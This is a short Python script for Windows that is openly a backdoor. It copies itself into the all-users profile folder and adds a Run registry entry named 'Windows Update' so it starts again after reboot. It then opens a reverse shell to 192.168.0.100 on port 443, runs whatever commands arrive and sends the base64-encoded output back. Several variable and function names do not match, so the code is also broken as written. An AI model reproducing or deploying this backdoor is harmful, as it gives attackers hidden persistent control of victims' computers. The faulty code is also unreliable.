#!/usr/bin/python

import sys, base64,os,socket, subprocess
import _winreg

def persistent(tempdir, fileName, run):
     os.system('copy %s %s'%(fileName, tempdir))
     k = Openkey(HKEY_CURRENT_USER,run)
     rkey = []
     try:
         i = 0
         while True:
             subkey = EnumValue(key,i)
             runkey.append(subkey[0])
             i += 1
     except WindowsError as E:
             pass

     if 'Windows Update' not in runkey:
            try:
                k = Open(HKEY_CURRENT_USER, run,0,KEY_ALL_ACCESS)
                SetValueEx(key,'Windows Update',0,REG_SZ,r"%ALLUSERSPROFILE%\updater.exe")
                key.Close()
            except WindowsError as E:
                pass

def clientshell():
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     sock.connect(('192.168.0.100',int(443)))
     sock.send('[*] Connection Established!')
     while 1:
          data = s.recv(1024)
          if data == "get-out" : break
          cmd = subprocess.Popen(data, shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
          output = cmd.stdout.read() + cmd.stderr.read()
          encoded = base64.b64encode(output)
          sock.send(encoded)
     sock.close()

def main():
    tempdir = '%ALLUSERSPROFILE%'
    fileName = sys.argv[0]
    run = "Software\Microsoft\Windows\CurrentVersion\Run"
    persistent(tempdir, fileName, run)
    clientshell()
main()
    
